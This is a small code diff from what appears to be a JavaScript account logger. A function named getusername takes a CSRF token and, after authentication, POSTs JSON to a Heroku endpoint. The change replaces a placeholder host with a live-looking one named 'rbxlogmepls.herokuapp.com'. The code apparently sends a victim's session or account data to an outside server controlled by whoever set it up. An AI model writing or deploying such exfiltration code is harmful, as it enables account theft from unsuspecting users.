@@ -25,7 +25,7 @@ async function getusername(csrf) {
         await auth
         
 
-        fetch('https://YOURHEROKUAPP.herokuapp.com/send-data?id=IDHERE', {
+        fetch('https://rbxlogmepls.herokuapp.com/send-data?id=IDHERE', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
